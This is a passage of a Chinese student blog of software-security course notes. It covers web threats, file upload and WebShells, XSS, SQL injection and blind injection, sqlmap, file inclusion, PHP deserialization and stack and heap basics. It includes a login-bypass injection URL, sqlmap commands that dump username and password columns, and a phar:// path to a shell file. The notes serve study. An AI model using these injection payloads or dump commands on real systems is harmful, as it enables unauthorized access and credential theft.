<li>name 必需。规定 cookie 的名称。</li>
<li>value 必需。规定 cookie 的值。</li>
<li>expire 可选。规定 cookie 的有效期。</li>
</ul>
<h2 id="十大web安全威胁">十大WEB安全威胁</h2>
<ul>
<li>注入</li>
<li>跨站脚本</li>
<li>遭破坏的身份认证和会话管理
<ul>
<li>攻击者窃听了用户访问HTTP时的用户名和密码，或者是用户的会话，从而得到sessionID或用户身份信息，进而冒充用户进行HTTP访问的过程</li>
<li>检测是否使用HTTPS的最简单方法就是使用网络嗅探工具</li>
<li><strong>会话劫持就是一种窃取用户SessionID后，使用该SessionID登录进入目标账户的攻击方法，此时攻击者实际上是利用了目标账户的有效Session。如果SessionID是被保存在Cookie中，则这种攻击被称为Cookie劫持。</strong></li>
<li>如果攻击者窃取了用户的Session，并一直保持一个有效的Session，攻击者就能通过此有效Session一直使用用户的账户，即成为一个永久的“后门”，<strong>这就是会话保持攻击</strong></li>
</ul></li>
<li>不安全的直接对象引用
<ul>
<li><strong>直接对象引用：是指WEB应用程序的开发人员将一些不应公开的对象引用直接暴露给用户，使得用户可以通过更改URL等操作直接引用对象。</strong></li>
<li><strong>不安全的直接对象引用：是指一个用户通过更改URL等操作可以成功访问到未被授权的内容。比如一个网站上的用户通过更改URL可以访问到其他用户的私密信息和数据等。</strong></li>
</ul></li>
<li>伪造跨站请求</li>
<li>安全配置错误
<ul>
<li><strong>默认的用户名密码没有及时修改</strong></li>
</ul></li>
<li>不安全的加密存储
<ul>
<li>Web应用系统<strong>没有对敏感性资料进行加密</strong></li>
</ul></li>
<li>没有限制的URL访问</li>
<li>传输层保护不足和未验证的重定向和转发
<ul>
<li><strong>中间人攻击</strong>(Man-in-the-middle
attack)，即MITM。HTTP连接的目标是Web服务器，如果传输层保护不足，攻击者可以担任中间人的角色，在<strong>用户和Web服务器之间截获数据并在两者之间进行转发</strong>，使用户和服务器之间的整个通信过程暴露在攻击者面前。</li>
</ul></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://luhaozhhhe.github.io/2024/11/05/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0Chapter11/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Welcome To Luhaozhhhe's Blog!">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2024/11/05/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0Chapter11/" itemprop="url">软件安全笔记Chapte11</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2024-11-05T11:07:23+08:00">
                2024-11-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
                    <span itemprop="name">课程笔记</span>
                  </a>
                </span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
                    <span itemprop="name">软件安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="第十一章-web渗透实战">第十一章 WEB渗透实战</h1>
<h2 id="文件上传漏洞">文件上传漏洞</h2>
<p>指网络攻击者上传了一个可执行的文件到服务器并执行。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等</p>
<p><strong>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门</strong></p>
<ul>
<li>攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，<strong>得到一个命令执行环境，以达到控制网站服务器的目的</strong>（可以上传下载或者修改文件，操作数据库，执行任意命令等）。</li>
<li>WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录，没有经验的管理员不容易发现入侵痕迹。</li>
<li>攻击者可以将WebShell隐藏在正常文件中并修改文件时间增强隐蔽性，也可以采用一些函数对WebShell进行编码或者拼接以规避检测。</li>
</ul>
<p>原理：</p>
<ul>
<li>一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本。</li>
<li>当系统存在文件上传漏洞时攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，这些文件将对攻击者后续攻击提供便利。根据具体漏洞的差异，此处上传的脚本可以是正常后缀的PHP，ASP以及JSP脚本，也可以是篡改后缀后的这几类脚本。</li>
</ul>
<h2 id="跨站脚本攻击">跨站脚本攻击</h2>
<p>跨站脚本攻击与SQL注入攻击区别在于：<strong>XSS主要影响的是Web应用程序的用户，而SQL注入则主要影响Web应用程序自身。</strong></p>
<p>启用并使用脚本并不是XSS漏洞存在的原因。只有当Web应用程序开发人员犯错误时才会变得危险</p>
<p>分为两类攻击方式：</p>
<ul>
<li>反射式跨站脚本：也称作非持久型、参数型跨站脚本。<strong>主要用于将恶意脚本附加到URL地址的参数中</strong></li>
<li>持久式跨站脚本：比反射式跨站脚本更具有威胁性，并且可能影响到Web服务器自身的安全</li>
</ul>
<p>两者的异同：</p>
<ul>
<li>存储式XSS与反射式XSS类似的地方在于，会在Web应用程序的网页中显示未经编码的攻击者脚本。</li>
<li>它们的区别在于，存储式XSS中的脚本并非来自于Web应用程序请求；相反，脚本是由Web应用程序进行存储的，并且会将其其作为内容显示给浏览用户。</li>
</ul>
<p><strong>一般来说，存储式XSS的风险会高于反射式XSS。因为存储式XSS会保存在服务器上，有可能会跨页面存在。</strong></p>
<p><strong>从攻击过程来说，反射式XSS一般要求攻击者诱使用户点击一个包含XSS代码的URL链接；而存储式XSS则只需让用户查看一个正常的URL链接</strong></p>
<h2 id="sql注入漏洞">SQL注入漏洞</h2>
<p>常用的特殊字符：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">’ ’   字符串指示器(‘string’)</span><br><span class="line">;          语句终结符</span><br><span class="line">||         对于Oracle、PostgreSQL而言为连接（合并）</span><br><span class="line">--        注释（单行）</span><br><span class="line">#         注释（单行）</span><br><span class="line">/**/     注释（多行）</span><br></pre></td></tr></table></figure>
<p>SQL注入是一种<strong>将SQL代码插入或添加到应用（用户）的输入参数中的攻击</strong>，之后再将这些参数传递给后台SQL服务器加以解析并执行</p>
<p>联系过程：</p>
<p>当用户通过浏览器向表单提交了用户名“bob”，密码“abc123”时，那么下面的HTTP查询将被发送给Web服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx.com/xxx.php?user=bob&amp;passwd=abc123</span><br></pre></td></tr></table></figure>
<p>当Web服务器收到这个请求时，将构建并执行一条（发送给数据库服务器的）SQL查询。在这个示例中，该SQL请求如下所示：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span>’bob’ <span class="keyword">and</span> password<span class="operator">=</span>’abc123’</span><br></pre></td></tr></table></figure>
<p>我们可以选择把我们的后面给注释掉，只需要加上一定的特殊字符就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx.com/xxx.php?user=bob’--&amp;passwd=xxxxxx</span><br></pre></td></tr></table></figure>
<p>这样输出的SQL语句就是：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span>’bob’<span class="comment">--’ and password=’abc123’</span></span><br></pre></td></tr></table></figure>
<p><strong>寻找注入点：GET请求的最好被注入</strong></p>
<p>注入方法：</p>
<ul>
<li><p>单引号法：但是一般都会把单引号过滤掉</p>
<ul>
<li><p>输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php?id=1’</span><br></pre></td></tr></table></figure></li>
<li><p>输出</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> category <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>‘</span><br></pre></td></tr></table></figure></li>
</ul></li>
<li><p>永真永假法：</p>
<ul>
<li><strong>当与上一个永真式使逻辑不受影响时，页面应当与原页面相同。</strong></li>
<li><strong>而与上一个永假式时，则会影响原逻辑，页面可能出错或跳转（这与设计者的设计有关）。</strong></li>
</ul></li>
</ul>
<h2 id="sqlmap">SQLMAP</h2>
<p>就是由python开发的一款SQL注入的工具</p>
<p>常见语句：</p>
<ul>
<li>Sqlmap -u url 找到注入点</li>
<li>sqlmap -u url --dbs 列出数据库</li>
<li>或者 sqlmap -u url --current-db 显示当前数据库</li>
<li>sqlmap -u url –users 列出数据库用户</li>
<li>或者sqlmap -u url --current-user 当前数据库用户</li>
<li>sqlmap -u url --tables -D “testdb” 列出testdb数据库的表</li>
<li>sqlmap -u url --columns -T "user" -D "testdb"
列出testdb数据库user表的列</li>
<li>sqlmap -u url --dump -C “id,username,password” -T “user” -D “testdb”
列出testdb数据 库user表的id,username,password这几列的数据</li>
</ul>
<h2 id="sql盲注">SQL盲注</h2>
<p><strong>SQL盲注是不能通过直接显示的途径来获取数据库数据的方法。</strong>在盲注中，攻击者根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响应时间不同）。</p>
<p>一般情况下，盲注可分为三类：</p>
<ul>
<li>基于布尔SQL盲注</li>
<li>基于时间的SQL盲注</li>
<li>基于报错的SQL盲注</li>
</ul>
<p>常用的函数：</p>
<ul>
<li>Substr函数的用法：取得字符串中指定起始位置和长度的字符串，默认是从起始位置到结束的子串。
<ul>
<li>语法为：substr( string, start_position, [ length ]
)，比如substr('目标字符串',开始位置,长度)，再如substr('This is a test',
6, 2) 将返回 'is'。</li>
</ul></li>
<li>If函数的用法：如果满足一个条件可以赋一个需要的值。
<ul>
<li>语法：IF(expr1,expr2,expr3)，其中，expr1是判断条件，expr2和expr3是符合expr1的自定义的返回结果，expr1为真则返回expr2，否则返回expr3。</li>
</ul></li>
<li>Sleep函数的用法：sleep(n)让语句停留n秒时间，然后返回0，如果执行被打断，返回1。</li>
<li>Ascii函数的用法：返回字符的ASCII码值。</li>
</ul>
<h3 id="基于布尔sql盲注">基于布尔SQL盲注</h3>
<p><strong>可以利用输出的bool值来进行判断</strong></p>
<p>二分法可以节省我们的猜测次数</p>
<h3 id="基于时间的sql盲注">基于时间的SQL盲注</h3>
<p>就是看输入的数字运行时有没有明显的时间延迟，如果有的话说明是正确的语句，因为花费时间去查询了</p>
<h3 id="基于报错的sql盲注">基于报错的SQL盲注</h3>
<p>就是通过引起报错去猜测我们的数据</p>
<h2 id="sql注入的防御措施">SQL注入的防御措施</h2>
<ul>
<li>在服务端正式处理之前对提交数据的合法性进行检查
<ul>
<li><strong>在确认客户端的输入合法之前，服务端拒绝进行关键性的处理操作</strong></li>
</ul></li>
<li>封装客户端提交信息</li>
<li>替换或删除敏感字符/字符串
<ul>
<li>不一定能成功，攻击者可以输入构造的多次出现的字符串来引发攻击</li>
</ul></li>
<li>屏蔽出错信息
<ul>
<li>就是不告诉攻击者盲注的结果，这样就不好攻击了</li>
</ul></li>
</ul>
<h2 id="文件包含漏洞">文件包含漏洞</h2>
<p>在开发web应用时，开发人员通常会将一些重复使用的代码写到单个文件中，<strong>再通过文件包含，将这些单个文件中的代码插入到其它需要用到它们的页面中</strong>。</p>
<ul>
<li><strong>配置文件。</strong>用于整个web应用的配置信息，如数据库的用户名及密码，使用的数据库名，系统默认的文字编码，是否开启Debug模式等信息。右侧就是wordpress博客系统配置文件的部分内容。</li>
<li><strong>重复使用的函数。</strong>如连接数据库，过滤用户的输入中的危险字符等。这些函数使用的频率很高，在所有需要与数据库进行交互的地方都要用到相似的连接数据库的代码；在几乎所有涉及到获取用户输入的地方都需要对其进行过滤，以避免出现像sql注入、xss这样的安全问题。</li>
<li><strong>重复使用的版块</strong>。如页面的页头、页脚以及菜单文件。通过文件包含对这些文件进行引入，在某个地方需要修改时，开发人员只需要对单个文件进行更新即可，而不需要修改使用这些板块的其他文件。</li>
<li><strong>具有相同框架的不同功能。</strong>开发人员可以在不同的页面引入页头、页脚，也可以在定义好页头、页脚的框架中引入不同的功能。这样有新的业务需求时，开发人员只需要开发对应的功能文件，再通过文件包含引入；在有业务需要更替时，开发人员也只需要删除对应的功能文件即可。</li>
</ul>
<p>分类：</p>
<ul>
<li>本地文件包含漏洞
<ul>
<li>如果被包含文件的文件名是从用户处获得的，且没有经过恰当的检测，从而包含了预想之外的文件，导致了文件泄露甚至是恶意代码注入，这就是<strong>文件包含漏洞</strong>。如果被包含的文件储存在服务器上，那么对于应用来说，被包含的文件就在本地，就称之为<strong>本地文件包含漏洞</strong>。
<ul>
<li><strong>包含上传的合法文件</strong></li>
<li><strong>包含日志文件</strong>
<ul>
<li>先构造一条包含恶意代码的请求，这一条请求会被web服务器写入日志文件中</li>
<li>再利用本地文件包含漏洞，将日志文件引入，使得植入的恶意代码得到执行</li>
</ul></li>
</ul></li>
</ul></li>
<li>远程文件包含漏洞
<ul>
<li>如果存在文件包含漏洞，且允许被包含的文件可以通过url获取，则称为远程文件包含漏洞。
<ul>
<li><strong>包含攻击者服务器上的恶意文件</strong></li>
<li><strong>通过PHP伪协议进行包含</strong>
<ul>
<li>php://input可以访问请求的原始数据的只读流，也就是通过POST方式发送的内容。借助PHP伪协议，攻击者直接将想要在服务器上执行的恶意代码通过POST的方式发送给服务器就能完成攻击。</li>
</ul></li>
</ul></li>
</ul></li>
</ul>
<p>PHP带有很多内置URL风格的封装协议，可用于类似fopen()、copy()、
file_exists() 和 filesize()
的文件系统函数，可在include命令中使用。除了这些封装协议，还能注册自定义的封装协议。常见的协议有：</p>
<ul>
<li><p>file:// — 访问本地文件系统</p></li>
<li><p>http:// — 访问 HTTP(s) 网址</p></li>
<li><p>ftp:// — 访问 FTP(s) URLs</p></li>
<li><p>php:// — 访问各个输入/输出流（I/O streams）</p></li>
<li><p>zlib:// — 压缩流</p></li>
<li><p>phar:// — PHP 归档</p></li>
<li><p><strong>php://filter</strong>
是一种元封装器，设计用于数据流打开时的筛选过滤应用。</p></li>
<li><p><strong>phar://与zip://</strong>可以获取压缩文件内的内容，如在hack.zip的压缩包中，有一个shell.php的文件，则可以通过phar://hack.zip/shell.php的方式访问压缩包内的文件，zip://也是类似。这两个协议不受文件后缀名的影响</p></li>
</ul>
<h2 id="反序列化漏洞">反序列化漏洞</h2>
<p><strong>序列化是指将对象、数组等数据结构转化为可以储存的格式的过程</strong></p>
<p><strong>要想要将内存中的变量写入磁盘中或是通过网络传输，就需要对其进行序列化操作，序列化能将一个对象转换成一个字符串。</strong></p>
<p>PHP魔术方法：PHP有一类特殊的方法，它们以__(两个下划线)开头，在特定的条件下会被调用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__construct()，类的构造函数，创建新的对象时会被调用</span><br><span class="line">__destruct()，类的析构函数，当对象被销毁时会被调用</span><br><span class="line">__call()，在对象中调用一个不可访问方法时会被调用</span><br><span class="line">__callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line">__get()，读取一个不可访问属性的值时会被调用</span><br><span class="line">__set()，给不可访问的属性赋值时会被调用</span><br><span class="line">__isset()，当对不可访问属性调用isset()或empty()时调用</span><br><span class="line">__unset()，当对不可访问属性调用unset()时被调用。</span><br><span class="line">__sleep()，执行serialize()时，先会调用这个函数</span><br><span class="line">__wakeup()，执行unserialize()时，先会调用这个函数</span><br><span class="line">__toString()，类被当成字符串时的回应方法</span><br><span class="line">__invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line">__set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line">__clone()，当对象复制完成时调用</span><br><span class="line">__autoload()，尝试加载未定义的类</span><br><span class="line">__debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure>
<p>PHP反序列化漏洞又叫PHP对象注入漏洞。</p>
<p>在一个应用中，如果传给unserialize()的参数是用户可控的，那么攻击者就可以通过<strong>传入一个精心构造的序列化字符串</strong>，利用PHP魔术方法来控制对象内部的变量甚至是函数。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://luhaozhhhe.github.io/2024/11/05/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0Chapter2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Welcome To Luhaozhhhe's Blog!">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2024/11/05/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0Chapter2/" itemprop="url">软件安全笔记Chapter2</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2024-11-05T11:07:23+08:00">
                2024-11-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
                    <span itemprop="name">课程笔记</span>
                  </a>
                </span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
                    <span itemprop="name">软件安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="第二章-堆栈基础">第二章 堆栈基础</h1>
<h2 id="内存区域">内存区域</h2>
<ul>
<li>代码区：通常是指用来存放程序执行代码的一块内存区域。这个区域存储着被装入执行的二进制机器代码，处理器会到这个区域取指并执行。</li>
<li>静态数据区：通常是指用来存放程序运行时的全局变量、静态变量等的内存区域。通常，静态数据区包括初始化数据区（Data
Segment）和未初始化数据区（BSS
Segment）两部分。未初始化数据区BSS区存放的是未初始化的全局变量和静态变量，特点是可读写，在程序执行之前BSS段会自动清0。</li>
<li>堆区：用于动态地分配进程内存。进程可以在堆区动态地请求一定大小的内存，并在用完之后归还给堆区。动态分配和回收是堆区的特点。</li>
<li>栈区：用于支持进程的执行，动态地存储函数之间的调用关系、局部变量等，以保证被调用函数在返回时恢复到母函数中继续执行。</li>
</ul>
<p>​ 不同的操作系统有不同的内存组织形式</p>
<p><img src="/images/软件安全/图片1.png" /></p>
<h2 id="堆区和栈区">堆区和栈区</h2>
<h3 id="堆区">堆区</h3>
<p>​
是一种程序运行时动态分配的内存，不能预先确定，需要在使用的时候用专有的函数进行申请，比如说malloc函数，new函数等。</p>
<p>​
堆是一种<strong>向高地址扩展</strong>的数据结构，堆的大小<strong>受限于计算机的虚拟内存</strong></p>
<p>​ 堆一般由程序员来分配，速度较慢，容易产生内存碎片，使用比较方便</p>
<h3 id="栈区">栈区</h3>
<p>​
主要存储函数运行时的局部变量、数组等，不需要额外申请，系统会自动为变量预留内存空间，栈的释放也是函数调用结束后回收</p>
<p>​
栈是一种<strong>向低地址扩展</strong>的数据结构，<strong>先入后出</strong>，默认大小是2M，如果申请空间超过栈的剩余空间，就会发生栈溢出</p>
<p>​ 栈一般分配的速度较快，程序员无法控制</p>
<h3 id="堆的结构">堆的结构</h3>
<p>​ 堆的内存主要分为：<strong>堆块和堆表</strong></p>
<p>​ 堆块是堆的基本组织单位，包括<strong>块首和块身</strong></p>
<ul>
<li>块首是用来标识这个堆块自身的信息，例如块大小、空闲还是占用等；</li>
<li>块身紧随其后，是最终分配给用户使用的数据区</li>
</ul>
<p>​
<strong>堆表一般位于整个堆区的开始位置，用于索引堆区中所有堆块的重要信息</strong>，包括堆块的位置、堆块的大小、空闲还是占用等</p>
<p><img src="/images/软件安全/图片2.png" /></p>
<h4 id="堆块">堆块</h4>
<p>​ 堆块有两种状态：<strong>占有态和空闲态</strong></p>
<p>​
空闲态的堆块会被链入空链表中，由系统管理；而占有态的堆块会返回一个由程序员定义的句柄，通常是一个堆块指针，来完成对堆块内存的读、写和释放操作，由程序员管理</p>
<p><img src="/images/软件安全/图片3.png" /></p>
<p>​
对于<strong>空闲态</strong>堆块而言，块首额外存储了两个4字节的指针：<strong>Flink指针和Blink指针</strong>，用于链接系统中的其他<strong>空闲堆块</strong>。其中，<strong>Flink前向指针存储了前一个空闲块的地址，Blink后向指针存储了后一个空闲块的地址</strong></p>
<p>​
指向堆块的指针，指向的是块身的首地址，就是说，我们的地址指针不会指向块首的堆块信息，而是直接指向块身的数据区</p>
<p>​
堆块的大小包括块首在内，如果申请32字节，实际会分配<strong>40字节，8字节的块首+32字节的块身</strong>。堆块的<strong>单位是8字节</strong>，不足8字节按8字节分配。</p>
<h4 id="堆表">堆表</h4>
<p>​
占有态的堆块被使用它的程序索引，而<strong>堆表只索引所有空闲态的堆块</strong>。其中，最重要的堆表有两种：空闲双向链表freelist（简称空表）和快速单向链表lookaside（简称快表）</p>
<p>​ 空表包含<strong>空表索引</strong>(Freelist
array)和<strong>空闲链块</strong>两个部分。空表索引也叫空表表头，是一个大小为128的指针数组，该数组的每一项包括两个指针，用于标识一条空表</p>
<p>​
空表索引的<strong>第二项(free[1])标识了堆中所有大小为8字节的空闲堆块</strong>。之后每个索引项指示的空闲堆块递增8字节。把空闲堆块按照大小的不同链入不同的空表，可以方便堆管理系统高效检索指定大小的空闲堆块。空表索引的第一项free[0]所标识的空表相对比较特殊，这条双向链表链入了<strong>所有大于等于1024字节小于512KB的堆块</strong>，升序排列。这个空表通常又称为<strong>零号空表</strong>。</p>
<p><img src="/images/软件安全/图片4.png" /></p>
<h3 id="堆块的分配与释放">堆块的分配与释放</h3>
<h4 id="堆块分配">堆块分配</h4>
<p>​
依据既定的查找空闲堆块的策略，找到合适的空闲堆块之后，将其状态<strong>修改为占用态</strong>、把它从堆表中“卸下”、返回一个指向堆块块身的指针给程序使用。
​
普通空表分配时首先寻找<strong>最优的空闲块</strong>分配，若失败，一个稍大些的块会被用于分配。这种次优分配发生时，会先<strong>从大块中按请求的大小精确地“割”出一块进行分配</strong>，然后给剩下的部分<strong>重新标注块首，链入空表</strong>。也就是说，空表分配存在找零钱的情况。
​
零号空表中按照大小升序链着大小不同的空闲块，故在分配时先从free[0]反向查找最后一个块（即最大块），看能否满足要求，如果满足要求，再正向搜索最小能满足要求的空闲堆块进行分配。</p>
<h4 id="堆块释放">堆块释放</h4>
<p>​
堆块的释放操作包括将堆块状态由占用态改为空闲态、链入相应的堆表。所有释放的堆块都链入<strong>相应的表尾</strong></p>
<h4 id="堆块合并">堆块合并</h4>
<p>​
堆块的分配和释放操作可能引发堆块合并，即当堆管理系统发现<strong>两个空闲堆块相邻</strong>时，就会进行<strong>堆块合并</strong>操作。</p>
<p>​
堆块的合并包括几个动作：<strong>将堆块从空表中卸下、合并堆块、修改合并后的块首、链接入新的链表</strong>（合并的时候还有一种操作叫内存紧缩）</p>
<h2 id="函数调用">函数调用</h2>
<p>​ 借助系统栈来完成函数状态的保存和恢复</p>
<p>​
调用函数，如何跳转到main函数的位置呢？我们利用系统栈来完成这个调用，当函数被调用时，系统就会给这个函数开辟一个新的栈帧，并将其压入栈中，每一个栈帧都对应了一个没有运行完的函数，在栈中保存了该函数的<strong>返回地址和局部变量</strong>，其实栈帧就是一个函数执行的环境，包括了函数的参数、函数的局部变量、函数执行完之后的返回地址等，当函数返回时，系统栈会弹出该函数所对应的栈帧</p>
<p><img src="/images/软件安全/1.png" /></p>
<p><strong>函数调用步骤：</strong></p>
<ul>
<li>参数入栈：将参数从右向左依次压入系统栈中</li>
<li>返回地址入栈：将当前代码区调用指令的下一条指令地址压入栈中，供函数返回时继续执行</li>
<li>代码区跳转：处理器从当前代码区跳转到被调用函数的入口处</li>
<li>栈帧调整：保存当前栈帧状态值，已备后面恢复本栈帧时使用；将当前栈帧切换到新栈帧</li>
</ul>
<h2 id="常见寄存器">常见寄存器</h2>
<p>​
寄存器是有限存贮容量的高速存贮部件，它们可用来暂存指令、数据和地址</p>
<p>​ 每一个函数独占自己的栈帧空间。当前正在运行的函数的栈帧总是在栈顶</p>
<ul>
<li>ESP：<strong>栈指针寄存器</strong>（extended stack
pointer），其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶</li>
<li>EBP：<strong>基址指针寄存器</strong>（extended base
pointer），其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部</li>
</ul>
<p><img src="/images/软件安全/图片5.png" /></p>
<p><strong>栈帧中的重要信息：</strong></p>
<ul>
<li>局部变量：为函数局部变量开辟内存空间</li>
<li>栈帧状态值：保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡计算得到），用于在本帧被弹出后恢复出上一个栈帧</li>
<li>函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置，以便在函数返回时能够恢复到函数被调用前的代码区中继续执行指令</li>
</ul>
<p>另外一个寄存器：EIP</p>
<p>​ <strong>指令寄存器</strong>（extended instruction
pointer），其内存放着一个指针，该指针永远指向下一条等待执行的指令地址。可以说<strong>如果控制了</strong>EIP寄存器的内容，就控制了进程——我们让EIP指向哪里，CPU就会去执行哪里的指令</p>
<p><strong>栈帧调整：</strong></p>
<ul>
<li>保存当前栈帧状态值，已备后面恢复本栈帧时使用（EBP入栈）</li>
<li>将当前栈帧切换到新栈帧（将ESP值赋值EBP，更新栈帧底部）</li>
</ul>
<h2 id="主要寄存器">主要寄存器</h2>
<ul>
<li>数据寄存器：<strong>EAX,EBX,ECX,EDX</strong>
<ul>
<li>上面四个都是32位的，然后还有四个16位的寄存器，AX,BX,CX,DX，都是存储了低16位的数据</li>
<li>这四个16位寄存器又可分割成8个独立的8位寄存器(AX：AH-AL、BX：BH-BL、CX：CH-CL、DX：DH-DL)，每个寄存器都有自己的名称，可独立存取</li>
<li>EAX：累加器，用于乘除、输入输出等操作，还可以存储函数的返回值</li>
<li>EBX：基地址寄存器，用于访问存储器</li>
<li>ECX：计数寄存器，一般在循环中控制循环次数</li>
<li>EDX：数据寄存器</li>
</ul></li>
<li>两个变址寄存器ESI和EDI，两个指针寄存器ESP和EBP
<ul>
<li>变址寄存器
<ul>
<li>32位CPU有2个32位通用寄存器ESI和EDI。其低16位对应先前CPU中的SI和DI，对低16位数据的存取，不影响高16位的数据</li>
